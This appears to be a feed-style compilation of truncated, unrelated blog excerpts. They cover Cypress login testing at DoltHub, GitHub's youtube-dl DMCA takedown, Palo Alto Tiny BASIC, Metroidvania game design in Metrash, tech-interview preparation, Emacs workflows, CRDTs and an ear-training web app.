    body<span>:</span> <span>{</span> username<span>,</span> password <span>}</span><span>,</span>
  <span>}</span><span>)</span><span>.</span><span>then</span><span>(</span><span>(</span>res<span>)</span> <span>=&gt;</span> <span>{</span>
    
    <span>expect</span><span>(</span>res<span>.</span>body<span>.</span>username<span>)</span><span>.</span>to<span>.</span><span>eq</span><span>(</span>username<span>)</span><span>;</span>
    
    cy<span>.</span><span>setCookie</span><span>(</span><span>"dolthubToken"</span><span>,</span> res<span>.</span>body<span>.</span>cookie_value<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>

  
  cy<span>.</span><span>getCookie</span><span>(</span><span>"dolthubToken"</span><span>)</span><span>.</span><span>should</span><span>(</span><span>"exist"</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>In the tests for private paths, instead of visiting the <code>/signin</code> page and then routing to whatever next page we want to test, we can log in using a request to the API and only route once to the page we want.</p>
<h3>Logging in using a HTML form</h3>
<p>When we initially wrote our Cypress tests, we only supported login using Google authentication. We had to manually set the appropriate cookies, which was slightly tricky and less representative of how a real user would log in. A few months ago we released <a href="https://www.dolthub.com/blog/2020-07-17-introducing-password-signin">login with username and password</a>, allowing users to enter their information in a form.</p>
<p>This was pretty straightforward and quick to get working. Here’s what that code looks like:</p>
<div data-language="typescript"><pre><code><span>function</span> <span>loginUsingForm</span><span>(</span>username<span>:</span> <span>string</span><span>,</span> password<span>:</span> <span>string</span><span>)</span> <span>{</span>
  
  cy<span>.</span><span>visit</span><span>(</span><span>"/signin"</span><span>)</span><span>;</span>
  cy<span>.</span><span>visitViewport</span><span>(</span><span>"macbook-15"</span><span>)</span><span>;</span> 

  
  cy<span>.</span><span>get</span><span>(</span><span>"[data-cy=signin-button]"</span><span>)</span><span>.</span><span>click</span><span>(</span><span>)</span><span>;</span>
  cy<span>.</span><span>get</span><span>(</span><span>"[data-cy=signin-email-form]"</span><span>)</span><span>.</span><span>should</span><span>(</span><span>"be.visible"</span><span>)</span><span>;</span>

  
  cy<span>.</span><span>get</span><span>(</span><span>"input[name=username]"</span><span>)</span><span>.</span><span>type</span><span>(</span>username<span>)</span><span>;</span>
  cy<span>.</span><span>get</span><span>(</span><span>"input[name=password]"</span><span>)</span><span>.</span><span>type</span><span>(</span>password<span>)</span><span>.</span><span>type</span><span>(</span><span>"{enter}"</span><span>)</span><span>;</span> 

  
  
  cy<span>.</span><span>location</span><span>(</span><span>"pathname"</span><span>)</span><span>.</span><span>should</span><span>(</span><span>"include"</span><span>,</span> <span>"/profile"</span><span>)</span><span>;</span>
  
  cy<span>.</span><span>get</span><span>(</span><span>"[data-cy=navbar-menu-avatar]"</span><span>)</span><span>.</span><span>should</span><span>(</span><span>"be.visible"</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>When you run the tests you'll see the username and password input in the form, submitted using the enter key, and routed to the <code>/profile</code> page with the user avatar in the navbar.</p>
<h3>And the winner is...</h3>
<p>After some discussion with teammates, we decided to do all logging in for both goals using the HTML form. Although logging in using the API was faster, we wanted to recreate the user workflow as much as possible, and using the API was less representative of how a user would interact with our website.</p>
<p>Once a user is logged in, we can't forget to log out after running the tests for the page. This ensures the correct state for the tests for next pages, so we added an option to log out a user as well:</p>
<div data-language="typescript"><pre><code><span>function</span> <span>logout</span><span>(</span><span>)</span> <span>{</span>
  
  cy<span>.</span><span>get</span><span>(</span><span>"[data-cy=navbar-menu-avatar]"</span><span>)</span><span>.</span><span>click</span><span>(</span><span>)</span><span>;</span>
  
  cy<span>.</span><span>get</span><span>(</span><span>"[data-cy=sign-out-button]"</span><span>)</span><span>.</span><span>click</span><span>(</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>We ended up making custom Cypress commands for both the log in and out functions. You can check them out <a href="https://github.com/dolthub/dolthub-cypress/blob/master/cypress/support/commands.ts">here</a>.</p>
<h2>Using secrets with GitHub Actions</h2>
<p>Before I could even start testing login using Cypress, I had to create a test account on DoltHub. It's important that we don't change the state of this account in order to maintain consistency in our tests. We run our Cypress tests on a schedule using <a href="https://github.com/features/actions">GitHub Actions</a>, so we could easily add the username and password of our newly created test account as secrets on GitHub.</p>
<p>I added the newly created secrets as env variables to our <a href="https://github.com/dolthub/dolthub-cypress/blob/master/.github/workflows/tests.yaml">GitHub workflow file</a> like this:</p>
<div data-language="yaml"><pre><code><span>env</span><span>:</span>
  <span>CYPRESS_TEST_USERNAME</span><span>:</span> $<span>{</span><span>{</span> secrets.CYPRESS_TEST_USERNAME <span>}</span><span>}</span>
  <span>CYPRESS_TEST_PASSWORD</span><span>:</span> $<span>{</span><span>{</span> secrets.CYPRESS_TEST_PASSWORD <span>}</span><span>}</span></code></pre></div>
<p>GitHub does not allow you to log secrets and secrets are not used in a pull request workflows if opened by a non-collaborator. However, Cypress logs some information when a test fails so we turned off the logs for the tests involving the username and password to be safe:</p>
<div data-language="typescript"><pre><code>
cy<span>.</span><span>get</span><span>(</span><span>"input[name=username]"</span><span>)</span><span>.</span><span>type</span><span>(</span>username<span>,</span> <span>{</span> log<span>:</span> <span>false</span> <span>}</span><span>)</span><span>;</span>

cy<span>.</span><span>get</span><span>(</span><span>"input[name=password]"</span><span>)</span><span>.</span><span>type</span><span>(</span>password<span>,</span> <span>{</span> log<span>:</span> <span>false</span> <span>}</span><span>)</span><span>.</span><span>type</span><span>(</span><span>"{enter}"</span><span>)</span><span>;</span></code></pre></div>
<p>If a dev on our team wants to test the login form or run our tests for private paths locally, they can add the username and password to a <a href="https://docs.cypress.io/guides/guides/environment-variables.html#Option-2-cypress-env-json">Cypress env file</a>, which we include in our <code>.gitignore</code> file to avoid checking in our secrets.</p>
<h2>Conclusion</h2>
<p>Going back to the video at the beginning, you can see the final product for what testing a private path now looks like. Before the tests are run for the <code>/profile/discover</code> page we're routed first to the <code>/signin</code> page. The username and password are entered in the form and submitted and we're successfully taken the user's profile. After the tests for the discover profile page are run, we click on the avatar in the upper right corner to log the user out.</p>
<p>We’re continually adding more Cypress tests for DoltHub. If you ever come across an bug on DoltHub, feel free to file a <a href="https://github.com/dolthub/dolthub-cypress/issues/new"><code>dolthub-cypress</code> issue</a> so we can write a test to make sure it never happens again. You can also chat with us about any issues, questions, or ideas you may have on <a href="https://discord.com/invite/RFwfYpu">our Discord server</a>.</p></div></div>]]>

		<p>GitHub has removed the ability to access youtube-dl's source code due to a DMCA.</p>

		<p>On the 23rd of October, GitHub received a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA</a> against the youtube-dl authors, claiming the software infringed copyright Laws. While I fundamentally disagree with this, let's talk more about it.</p>
<p>First off, it should go without saying that this source code needs to be held elsewhere, outside of the control of GitHub or GitLab. We've seen an increasing amount of <a href="https://github.com/github/dmca/tree/master/2020/10">Cease and Desist</a> notices being sent to GitHub, with a staggering 124 (!) in October of 2020.</p>
<p>Secondly, copyright claims such as these are harmful to genuine software development. While these claims do hold some truth, some say it is fundamentally <em>unjust</em> to prevent access to an educational source code repository.</p>
<p>In light of distributed source code hosting platforms such as Git, thousands of developers have the public domain youtube-dl source code stored <em>locally</em>, hence the claim to remove the source code is impossible.</p>
<p>Nevertheless, there are still ways to access this source code. For starters, the <code>youtube-dl</code> module is still available on <a href="https://pypi.org/project/youtube_dl/">PyPi</a>, a package hosting platform for Python. Also, <a href="https://gitee.com/mirrors/youtube-downloader">Gitee (a Chinese Git platform)</a> contains a copy of youtube-dl in its entirety.</p>
<p>I would encourage you all to create mirrors on alternative Git hosting platforms. I'm more than happy to update this article with any further information.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
				




<p><a href="https://maly.cz/">Martin Malý</a> has adapted Version 2 of Li Chen Wang’s <a href="https://en.wikipedia.org/wiki/Tiny_BASIC#Palo_Alto_Tiny_BASIC">Palo Alto Tiny BASIC</a> to run on his <a href="https://www.asm80.com/">ASM80</a> browser-based assembler and emulator. I’ve uploaded <a href="https://github.com/Geddd/PATB4ASM80">the source code</a>, with his permission, to GitHub.</p>



<p><strong>Background</strong></p>



<p>Palo Alto Tiny BASIC emerged out of the Tiny BASIC movement started by People’s Computer Company and taken up by the Homebrew Computer Club. Fellow members Steve Wozniak and Tom Pittman would develop their own BASICs (Integer BASIC and 6800 Tiny BASIC respectively). Wang analyzed the Altair BASIC code and contributed edits to Tiny BASIC Extended. Wang published in the newsletter a loader for the 8080, commenting on the <em>Open Letter to Hobbyists:</em></p>



<blockquote><p>Altair Basic has a bootstrap loader of twenty or twenty one bytes long. In principle, you can use this bootstrap to load in your own loader which will then load in your program. However, since Mr. Bill Gates claims that he did not yet payed [sic] enough and is in the mood of calling people thieves. (See HBCC newsletter ’12-1.) I decided to code one myself. What comes out is a bootstrap of sixteen bytes long. This is still too long, maybe our professional experts can make it shorter. For the time being you are welcome to copy mine and I will not call you a thief (this includes Mr. Gates).</p></blockquote>



<p>No surprise then that Li Chen Wang made his BASIC implementation available for free. (I found this quote reading old Homebrew newsletter articles in my research for the <a href="http://troypress.com/basic-interpreters-new-wikipedia-article/" data-type="post" data-id="853">BASIC interpreter article</a>.)</p>



<p>The only smaller implementation of Tiny BASIC was <a href="http://troypress.com/the-dialects-of-tiny-basic/" data-type="post" data-id="878">MINOL</a>, which used unsigned bytes instead of signed integers and which used nonstandard commands. Also weighing in under 2kB, when a common method of shipping interpreters was 4kB ROMs, Palo Alto Tiny BASIC supported a more typical version of the language while leaving extensive room for customization for specific hardware, something which was taken advantage of multiple times, for the TRS-80, the <a href="http://troypress.com/astro-basic/" data-type="post" data-id="867">Bally Astrocade</a>, the Sharp PC-1211, and the Cromemco.</p>



<p><strong>The Code</strong></p>



<p>It’s been fun to play with the source code that was behind three of the computers I used as a kid. Some things I learnt:</p>



<ul><li>The code is very well structured and extensible. I added a few commands in under an hour (<em>PEEK, FRE()</em>). All you need to do is insert new commands in the keyword table, then adapt code elsewhere.</li><li>I was very excited to find a few small bugs in the code:<ul><li>The system famously had only three error messages (“WHAT?” for syntax errors, “HOW?” for functional errors, and “SORRY” for capacity issues). If you execute a <em>RETURN</em> with no corresponding <em>GOSUB</em> you get a &nbsp;“WHAT?” instead of a “HOW?”</li></ul><ul><li><em>10 INPUT “HELLO WORLD” </em>acts like a valid <em>PRINT</em> statement when it should cause a syntax error, since no variable is specified to receive the input.</li></ul><ul><li>The language only supports integers, but decimals aren’t ignored as they should be. <em>PRINT 1.1, 1.2</em> outputs <em>1</em> and <em>0</em>.</li></ul></li><li>There’s an Easter egg! “W”, “AN”, “G”</li></ul>

<p><strong>RST 1 Routine</strong></p>



<p>The RST 1 routine is a work of art, using the call stack to determine where its parameters are, with the byte after RST 1 specifying the character to match and the byte after that specifying the offset to jump to. Wang’s ability to write such memory-efficient code is why he didn’t need to implement the <a href="http://troypress.com/the-tiny-basic-interpretive-language-il-and-onions/" data-type="post" data-id="249">IL virtual machine</a>.</p>

Specifically, when you first emerge from Kokiri Forest into Hyrule Field, and see a vast expanse of meadows and blue skies.</p><p>Or something grittier, like <em>Dark Souls</em>, which lets the player explore an intricate, interconnected space.</p><p>An arcade game might increase a speed or difficulty variable to keep a player engaged. But an exploration game teases the unknown. Not only in its world design, as in:</p><blockquote><p><em>“Ooh, there’s a castle in the distance! Can I go there?”</em></p></blockquote><p>But also in its mechanics, as in:</p><blockquote><p><em>“What’s in this vase? Can I whack this vase with my sword?”</em></p></blockquote><hr><p>So if you wanted to make a game that features exploration at its core, how would it work?</p><p>One common formula is the <strong>Metroidvania</strong>. It's a genre that teases the unknown by restricting parts of the world until you've obtained or mastered certain abilities.</p><p>Which is why, in the rest of this post, I dive into the game design of Metrash.</p><a href="https://www.lexaloffle.com/bbs/?tid=34935" target="_blank">Metrash is a Metroidvania made by a developer who goes by Steed, and it's made in PICO-8.</a> <em>But don't let that turn you off from reading!</em><p>Because the great thing about well-crafted PICO-8 games, is that:</p><ol><li>They don’t take 70 hours to play. (Metrash is maybe 1 hour of gameplay, tops.)</li><li>They provide source code, if you’re curious enough to study it.</li><li><strong>They can teach us a lot about their genre of game design</strong>. Specifically, about Metroidvanias.</li></ol><p>So in the rest of this post, I take apart the design of Metrash to explain how it works. And in doing so, I define the principles of a Metroidvania, so that you can apply these principles to a game of your own.</p><p>Let’s get started!</p><h2 id="0-the-mda-framework">0. The MDA framework</h2><p>To ensure we're starting from the same base, I want to cover the MDA framework.</p><p>It stands for Mechanics–Dynamics–Aesthetics, and it's a useful lens for viewing exploration games:</p><ol><li><strong>Mechanics</strong>. The rules of the game. Player input, code, world physics, that sorta thing.</li><li><strong>Dynamics</strong>. The patterns of play that emerge from the mechanics. That could be racing, as in <em>"I'm hugging the side of the racetrack so that I can beat the other guy to the finish line"</em>, or survival, as in <em>"I'm building a fort so that zombies don't attack me in Minecraft"</em>.</li><li><strong>Aesthetics</strong>. The emotional responses to the dynamics. For racing, that could be the feeling of competition. For survival, that could be the feeling of safety (or lack thereof).</li></ol><p>Under this mental framework for thinking about games, you'll notice that <strong>exploration is an aesthetic</strong>. In other words, the <em>feeling of discovery</em> is an emotional response in the player.</p><p>And you can't create that feeling directly. You can only create mechanics, and hope that your aesthetic intent occurs in the player's mind.</p><div>

	<small>Remember the saying, <em>"If a tree falls in a forest, but no one is around to hear it, did it make a sound?"</em> It's kinda like that.</small>
  </p></div><p>But what mechanics lead to a feeling of discovery? Here's how Metrash does it...</p><h2 id="1-teach-your-mechanics-implicitly">1. Teach your mechanics implicitly</h2><p>Whether intentional or not, Metrash implements the feeling of discovery at multiple levels of its design.</p><p>The first thing it does is <strong>teaching the game's mechanics non-verbally</strong>.</p><p>In the game, you play as a mechanical contraption (that looks kinda like 343 Guilty Spark from <em>Halo</em> 😄), and you are let loose to explore a gizmo-infested world.</p><p><span>

Design for orthogonality in your verbs and objects</h2><p>Recall from our discussion of the MDA framework that mechanics create dynamics.</p><p>So in order to create a broad space of possibilities for play, <strong>we should choose mechanics that create distinct dynamics</strong> –&nbsp;hence the word "orthogonal".</p><p>Metrash does this extremely well, by inviting distinct styles of play for each verb-enemy pair:</p><p><span>

They ensure you have enough (possible) content for the player to explore.</p><h2 id="recap">Recap</h2><p>So to recap what we've learned from Metrash:</p><ol><li><strong>The MDA framework</strong>. Analyze games in terms of their Mechanics, Dynamics, and Aesthetics.</li><li><strong>Create mechanical discovery</strong>. Teach your mechanics implicitly.</li><li><strong>Create spatial discovery</strong>. Gate parts of your game world to tease the player.</li><li><strong>Create a broad possibility space</strong>. Design an orthogonal set of game mechanics.</li></ol><p>Note that the feeling of discovery <em>doesn't</em> arise from exploring a huge, open world. (Metrash is only as large as PICO-8's map space.)</p><p>Rather, it comes from the player's understanding of the game's verbs. It's a story about the relationship between <strong>maneuvering</strong>, and <strong>deciding when to shoot</strong>.</p><p>So choose your verbs carefully. Then <em>explore</em> the relationship between them. That's how you make an exploration game.</p><h2 id="but-how-do-i-make-my-own-metroidvania">But... how do I make my own Metroidvania?</h2><p>Kynan Pearson has a nice, less-theoretical guide <a href="http://subtractivedesign.blogspot.com/2013/01/guide-to-making-metroidvania-style.html" target="_blank">at his blog</a>.</p><p>And if you're anything like me, you don't want to clone <em>Metroid</em> –&nbsp;you want to make something <em>new</em>.</p><p>So here are some ideas that riff on the idea of exploration and discovery:</p><ul><li><strong>Branching</strong>. Metrash turns out to be a rather linear experience. How would you create a branching narrative? And how does that play into the feeling of discovery?</li><li><strong>Take away the mechanics</strong>. What if you take away the mechanics, and only leave spatial exploration?<ul><li>Would that be like exploring a maze? Maybe you’d emphasize competition over discovery, like in laser tag, or <em>Harry Potter: Goblet of Fire</em>.</li><li>Does that make a Walking Sim a degenerate form of Metroidvania? How would you create player engagement?</li></ul></li><li><strong>Language mechanics</strong>. What about linguistic exploration instead of spatial exploration? How would you learn a language through a game?</li><li><strong>You're a scientist</strong>. What if you’re Charles Darwin, and you’re uncovering facts about how birds interact in an ecosystem?</li><li><strong>Detective mechanics</strong>. What about detective games, where you’re exploring evidence in order to identify a culprit?</li></ul></div></div>]]>

<blockquote>
<p>Tldr;</p>
<ul>
<li>READ <a href="https://twitter.com/patio11">@patio11</a>'s classic <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">Salary Negotiation post</a>. Every one should read it and then re-read it. This covers bits of it, but assumes the reader has already gone through it, so this focuses more on tactical techniques.</li>
<li>The best leverage is another offer (always have a good <a href="https://en.wikipedia.org/wiki/Best_alternative_to_a_negotiated_agreement">BATNA</a>), or a well positioned starting place.</li>
<li>The best way to get good offers is to do well on the interviews:<ul>
<li>practice a lot, mostly for the things you'll be tested on<ul>
<li>for most engineers this means coding questions, system design questions, (sometimes) debugging code, and project review.</li>
</ul></li>
</ul></li>
<li>It's a numbers game and timing matters quite a lot.</li>
<li>Practice negotiating, all the usual tips:<ul>
<li>Don't mention numbers, get them to give you an offer (you can nudge them that you're expecting "competitive" offers given the other companies you're interviewing at)</li>
<li>Don't haggle or go back and forth too many times. Ideally you get all the initial offers, then progressively use them against each other 1-2 times at most.</li>
<li>Figure out which levers matter to you the most (equity? location? level?) and when they don't have freedom to adjust in one, try another. Be willing to give in one dimension that matters less to you in order to take in another that matters more.</li>
</ul></li>

<p>Having recently gone through the tech interview loop, and discussing it with half a dozen friends who did the same, I realized how much private knowledge there was around optimizing the whole process. The unfortunate truth is that a lot of this information can make a <code>$10k-100k+</code> difference in salary for otherwise the same engineer. Some of it is common sense, but a lot of it is learned through word of mouth or collecting various sources online. So I wanted to level the playing field and put it all in one place in the hopes this helps a few folks who perhaps have less access to this information.</p>
<p>A little bit about myself: throughout my (6) internship experiences at the University of Waterloo I went through many dozens of interviews. It served as preparation for new grad interviews where I got several offers including Shopify and Google (where I eventually signed). After four years at Google I decided to go through the process again, and eventually received four offers at all the places I had onsites with: Square, CloudKitchens, Robinhood and Stripe. I even consulted with a <a href="https://fearlesssalarynegotiation.com/coach/">negotiation coach</a> (highly recommend him if you're not excited about the prospect of doing this yourself) and was told I had done everything I could have to get the best offer. I'm by no means an expert in this whole thing, but I've gotten to see a lot about how it works and had fun trying to pick it apart, while also learning a lot from others doing the same.</p>
<p>This guide is targeted at those who already have engineering experience, or perhaps are just going through their first round of interviews, but not those still learning computer science - for that there are plenty of other <a href="https://twitter.com/RandallKanna/status/1285630730610053123?s=20">great sources</a>. Otherwise, I'm assuming that you've decided to look around for an opportunity and want to do it in the most effective way possible. I hope this guide is as tactical as possible, so I'll keep things brief and actionable.</p>

<p>In the ideal case (and I'm not quite there either, but want to be more deliberate about it) you'll naturally have made friends and acquaintances throughout the industry that will think of you when they need to hire someone. A lot of times, these sorts of referrals will bypass parts or all of the standard interview process. Even if this is the case, unless you have a really good sense of the job market and the offer ranges for your experience level, <strong>I still recommend doing a couple of other interviews before taking such an offer</strong> so you can be confident it's competitive.</p>
<p>Most people, especially starting out, will have to seek out their own opportunities and that's fine! <strong>Define a criteria</strong> for yourself of things that interest you, locations you'd be willing to relocate to (remote?), and values you care about in a company. Don't necessarily restrict yourself to these for applying since you want to <strong>cast your net as wide as possible in the beginning</strong>, but keep your criteria in mind as you get closer to making your decision. Be sure to apply to companies that you know give out very high offers, even if you're not thrilled about working there because you may be able to use their offers as leverage.</p>
<p>It might be helpful to create an <code>Inteview Tracker</code>. I used a <a href="https://www.notion.so/vimota/adc4e53c94ea4f7a92e7af271d9d6d94?v=830efb1379904a6bad53cbf6d7e453a5">Notion Kanban board</a> to keep track of the different stages I was in for each company.
<img src="https://i.imgur.com/rqz9t7M.png"></p>
<p>Once you've applied to all the companies on your list, try to reach out to people in those companies to get 1) information about the interview process and the company culture and 2) potentially fast tracked through it. If you know someone at one of these companies, reach out to them! Even if you don't, pass around a list of companies you're interested in to people you know working in tech, there's a good chance they know someone who does. Cold reach outs work too, Jake does a great job of covering how to do this in his post <a href="https://justjake.substack.com/p/a-hackers-guide-to-job-hunting">A Hacker's Guide to Job Hunting</a>, I can't recommend this approach enough. Twitter is another great place to cold reach out to people at companies you're especially interested in. Most companies will have a modified process for referrals, and there's lots you can learn about a company's internal process for evaluating candidates that will help your chances, so this step can really help.</p>

<p>The best way to get great offers is to do well on the interviews. Your performance on the interviews is more than just pass/fail. Going above expectations on them gives you and the recruiter ammunition to push on the higher end of their allowed band, so try to really invest in practicing deliberately.</p>
<p>The format of the interview should be pretty familiar to you, 90% of companies follow something like this: Phone screen (coding question) -&gt; Onsite (2-3 coding questions, 1 system design, 1 project review). Sometimes they'll have a do-on-your-own-time project based interview instead, with a shorter 1-2 hour onsite. Lots has been written on how to practice for these already so I'll just link to some of the <a href="https://twitter.com/RandallKanna/status/1285630729850953729">best resources</a> and describe my general approach. 4-6 weeks of a couple of hours after work and on weekends should be more than enough time to prepare for the phone screens and onsites.</p>
<p>If you're intimidated by the open endedness of practicing for coding questions, I recommend starting by following a guide like <a href="https://yangshun.github.io/tech-interview-handbook/best-practice-questions/">this one</a>. You don't need to do every question for every week, and the dynamic programming week could be just skimmed through (in practice these are rarely asked), but it serves as a good path to make sure you cover most types of questions and continue making progress. On top of that it's useful to spend a couple sessions on:</p>
<ul>
<li><strong>algorithms and data structures</strong>; their trade offs and use cases and time complexity. <a href="https://www.interviewcake.com/data-structures-reference">These</a> are good <a href="https://github.com/kdn251/interviews">starting points</a>.</li>
<li><strong>object oriented programming and patterns</strong></li>
<li><strong>locks, parallelism and multi-threading</strong>. It's rare to get these in coding questions, but you should have some sense of what they are and how they're used. They sometimes come up when discussing follow ups to questions or in system design interviews. I mostly just reviewed the concepts with <a href="https://www.justsoftwaresolutions.co.uk/threading/locks-mutexes-semaphores.html">this</a> post, and made sure I knew how it was done in my programming language of choice, Python.</li>
<li>quirks about your <strong>programming language</strong> of choice. This probably isn't a deal breaker, but being able to drop some niche knowledge about the programming language you're using when it comes up in an interview makes you look like you really know your stuff. For example, I make sure to mention Python's Global Interpreter Lock (GIL) when talking about parallelism. <a href="https://www.notion.so/vimota/Python-Notes-7caf363f246f40ef9095e4ee13d6bcc0">Here</a> are some notes about things particular to Python I took along my practice. This is part of the reason I choose to interview with Python, it tends to have fewer things that "experts" are expected to know (compared to say, Java, where there are a million best practices), ie. fewer gotchas.</li>
</ul>
<p>The system design questions are a whole other beast, and deserve their own practice. You may not encounter them depending on the type of role you're interviewing for, but they're common for <code>full stack</code> and <code>backend</code>. They can be intimidating at first because they tend to be so open ended and have no "right answer", but once you've gone over a few examples you'll get familiar with the template you use to answer them.</p>
<ul>
<li>Go through <a href="https://github.com/donnemartin/system-design-primer">a primer</a>, taking notes on the different components that are used. Take note of the different failure modes that each part of the system can have and solutions to them (ie. retries, redundancy, timeouts, throttling, etc).</li>
<li>Impress the interviewer by naming actual services that represent each of the abstract components you're using (ie. Load balancer -&gt; NGINX, HAProxy, ELB ; cache -&gt; redis, memcache) and mention the differences between them or whether you've ever used them. This shows you have real world experience.</li>
<li>Practice answering some! Read through some <a href="https://www.educative.io/courses/grokking-the-system-design-interview/m2yDVZnQ8lG">examples</a> to learn how to structure you answers. Youtube is a solid resource for this.</li>
<li>Consistent hashing, concurrency models, partitioning, and caching are all important topics to understand.</li>
</ul>
<p>The bulk of questions you get will be covered by these, but there's a long tail of styles of questions you could also get: refactoring, debugging an open source project, designing an API, extending an existing class. It doesn't make sense to optimize for these, but know that they exist and try to get some "real world" practice as well beyond just Leetcode questions.</p>

<p>Timing matters. Try to schedule your interviews in a way that increases the chances you'll do well on the …</p></div></article></div>

			<p>In this video blog I talk about the persistent question of “the killer
app” that gets asked in the Emacs community.  I explain why I think the
identification of a single package is often not enough to appreciate the
true value proposition of Emacs.  My case emphasises the importance of
workflows; workflows that typically combine lots of distinct tools and
benefit from core Emacs attributes.  It is the whole system that
matters, because all those packages—in their given combinations—make
up our day-to-day computing experience with Emacs.</p>

<p>The text of the presentation is written in <code>org-mode</code> notation and is
reproduced below.  Also check my Emacs configuration file, from where
you can get the code I use: <a href="https://protesilaos.com/dotemacs">https://protesilaos.com/dotemacs</a>.</p>

<pre><code>#+TITLE: Vlog: Emacs is my “favourite Emacs package”
#+AUTHOR: Protesilaos Stavrou · protesilaos.com

* Getting into the Emacs mindset

I will to talk to you about my approach to a recurring topic in the
Emacs community, best encapsulated in this question:

/What is your favourite package?/

Similar formulations:

+ What is the one thing that makes Emacs indispensable to you?
+ Which is Emacs' killer app?

Such questions can lead us to valuable findings.  There is truth to be
had in the insights drawn from them and we must learn as much as we can
in the process.

Note though that this type of inquiry expects from us to engage in an
analytical exercise that extracts an object from its milieu.  It puts us
in a frame of mind that can miss the true value proposition of Emacs.

The problématique comes with the latent risk of holding us captive to a
frame of mind characterised by *decontextualisation*, of examining an
object without reference to the environment that renders it possible.

Instead of thinking about workflows that can take you from one context
to another, we are expected to identify some silo of functionalities.
Are we then underestimating everything else that contributes to our
day-to-day /experience/ with Emacs?

* Don't ignore the forest while looking at the tree

Now before I get misunderstood: yes, Org and Magit are great; yes, there
are lots of individual packages that make your life easier; and yes,
there is value in finding which package[s] people enjoy the most.

What about the combination of all utilities?  What about the *gestalt*?

If you claim that “my favourite package is X” and then fail to couch
your statement in terms of the rest of the toolkit you rely on, you are
likely to underappreciate---or altogether ignore---the true value
proposition of Emacs.

You do not acknowledge how the whole system is pieced together.  More
importantly, you may not realise the potential of Emacs' extensibility,
which is dynamic or case-dependent.

In other words, Emacs provides the means to implement a metaphor like
that of the vaunted Unix pipes across its entire space.  In practical
terms, you can connect your email client to your agenda, your RSS reader
to your custom note-taking system, your music manager to your directory
editor, and so on.  And all these can benefit from interfaces for
searching, editing in bulk, etc.

My claim here is that most of the times there is no one package or
narrow subset that make Emacs great.  It rather is the linkages between
several pieces of code that make Emacs a pleasure to work with.  They
contribute to predictable-yet-flexible workflows.  These keep Emacs
relevant and, dare I say, intriguing.

* The three core attributes of Emacs

Emacs is programmable and introspectable.  Both presuppose transparency.
These make the Emacs experience open-ended.

+ Programmable :: One set of features can be made to interface with
  another, even though it was not conceived with the express purpose of
  optimising for that particular scenario.  What can be done with Emacs
  is not predetermined.  There is always scope for something new.

+ Introspectable :: The user can examine the entire code base or a
  specific implementation and, potentially, figure out how to connect to
  it through some other tool.  This is further supported by the robust
  self-documentation facilities of Emacs, as well as the high quality of
  material that is readily available through the built-in Info reader.
  Introspection has contributed to the /documentation culture/ that
  characterises the Emacs community at-large.

+ Transparent :: Emacs does not conceal its internals.  Virtually every
  case can be handled using the same language the code is written in
  (Emacs Lisp) while benefiting from live evaluation of new code.  You
  change something and you see it in action.  Combined with the
  self-documenting nature of Emacs, transparency provides insight into
  practically every single construct that makes up Elisp.  Which
  empowers us to make best use of Emacs' programmability.

When considered together, these engender the *interconnectedness* that
defines the Emacs space.
* Introspection in action

Quick demo of running =C-h o= (=describe-symbol=) over =mapcar= and =mapconcat=
and then testing those expressions.

#+begin_src emacs-lisp
(mapcar #'upcase '("one" "two" "three"))

(mapconcat #'upcase '("one" "two" "three") "-")
#+end_src

We can use =C-x C-e= (=eval-last-sexp=) to get live feedback of what each
function does.

We can check the log with =C-h e= (=view-echo-area-messages=).

These are the rudimentary tools you rely on to start using ELisp.  They
offer you the means to experiment with how to extend Emacs.
* A quick look at combining tools

Now let me switch to another window layout, where I have some plain text
files in a standard directory.  Nothing fancy here.  Just to show how
standard Emacs tools can combine together to deliver a consistent
computing experience.

+ Switching to another layout involves the built-in tabs (=tab-bar-mode=)
  plus some bespoke code of mine.
+ Find file at point using a filename or just part of a file (=C-x C-f M-n=).
+ Use a completion framework (=icomplete-mode= in my case).
+ Benefit from a pattern-matching style (=orderless= for me).
+ Jump to the directory that contains the file (=dired-jump=).
+ While in Dired, jump to an item using completion (=dired-goto-file=).
+ Or filter the Dired list and then find the item (=% m= potentially
  followed by =t k=).

* Interconnectedness in the Emacs space

My point is to highlight the true value of Emacs' extensibility.  Which
is realised in the connections you make between several pieces of
functionality.

And, as I already mentioned, one package does not need to know about the
presence of another /in advance/.

Your focus should be on the workflow.  On the whole system that helps
you get things done with Emacs.  Because that is what your actual
experience is about.  You benefit from the set of /emergent qualities/
that become available in the combination of otherwise disparate pieces
of functionality.

Let me stress the importance of interconnectedness in the Emacs space by
showing you another quick demo that combines three distinct packages
that were not developed for the express purpose of being combined
together:

+ =elfeed= for reading RSS/Atom feeds.
+ =bongo= for managing media files or links.
+ And my own experimental note-taking system (=usls=).

Finally, this entire presentation is made possible by combining several
tools:

+ =org-mode=
+ =olivetti-mode=
+ =org-tree-slide-mode=
+ =variable-pitch-mode=
+ my own commands for setting fonts

Development was initially motivated by collaborative text editing and mobile computing. CRDTs have also been used in online chat systems, online gambling, and in the SoundCloud audio distribution platform. The NoSQL distributed databases Redis, Riak and Cosmos DB have CRDT data types.</p>  </div></div>]]>

</tr></tbody></table><p>Now run , it randomly selects note and plays it. Select answer <span id="answers">, , , , , , , , , , , </span>, if wrong it plays note second time so you can make another try. Or you can  selected note again.</p><p>Correct answer increases counter <span id="counterLabel">0</span>, incorrect resets it to zero. Buttons has keyboard shortcuts, corresponding key marked by underline. For example type <span>t</span> to run "<u>T</u>est",  <span>c</span> to answer "<u>C</u>", <kbd>Shift</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™¯</u>" and <kbd>Alt</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™­</u>" (not sure how it would work in Safari).</p><p>I think the way to go is making strong connections between sound and its name. Knowing not guessing. I've started with just two notes â€” G3 and C4. I close my eyes and go through hundreds of tests. Once I felt confident I've added G4, than C5.</p><p>TODO:</p><ul><li>store configuration in URL hash<br></li><li>select instrument</li><li>store instruments on server</li></ul><p>UPDATES:</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioContext">window.webkitAudioContext</a> for Safari</li><li>buttons to answer sharps and flats</li><li>mark incorrect answer with color</li><li><code>accesskey</code> replaced by 